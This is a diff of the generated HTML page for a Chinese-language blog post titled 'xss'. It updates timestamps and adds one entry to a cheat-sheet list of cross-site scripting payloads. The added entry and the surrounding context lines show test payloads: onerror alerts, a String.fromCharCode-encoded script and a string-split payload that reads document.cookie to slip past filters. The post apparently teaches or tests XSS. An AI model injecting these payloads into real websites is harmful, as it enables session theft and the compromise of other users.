@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://tranzimiss.com/2018/12/04/xss/x">
 <meta property="og:image" content="x:kcf">
 <meta property="og:image" content="http://tranzimiss.com/2018/12/04/xss/1">
-<meta property="og:updated_time" content="2019-05-12T13:12:04.444Z">
+<meta property="og:updated_time" content="2019-06-20T03:03:14.820Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss">
 <meta name="twitter:description" content="UXSSXSS蠕虫rookit xssFlash XssCRLF注入在响应头会导致XSS使用场景 直接嵌入html: &amp;lt;script&amp;gt; alert(&amp;#39;XSS&amp;#39;);&amp;lt;/script&amp;gt; 元素标签事件： &amp;lt;body onload=alert(&amp;#39;xss&amp;#39;)&amp;gt; 图片标签： &amp;lt;img src=&amp;quot;javascript:alert">
@@ -458,6 +458,7 @@
 <li><video src="x" onerror="alert(48)"></video></li>
 <li><audio src="x" onerror="alert(47)"></audio></li>
 <li><img src="1" onerror="location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29""></li>
+<li><script>String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41,59)</script>     \将ascii转换为字符串</li>
 </ul>
 
       
@@ -470,7 +471,7 @@
         <p><span>本文标题:</span><a  href="/2018/12/04/xss/">xss</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Trans 的个人博客">Trans</a></p>
         <p><span>发布时间:</span>2018年12月04日 - 21时29分</p>
-        <p><span>最后更新:</span>2019年05月12日 - 21时12分</p>
+        <p><span>最后更新:</span>2019年06月20日 - 11时03分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/12/04/xss/" title="xss">http://tranzimiss.com/2018/12/04/xss/</a>
             <span class="copy-path" data-clipboard-text="原文: http://tranzimiss.com/2018/12/04/xss/　　作者: Trans" title=""></span>
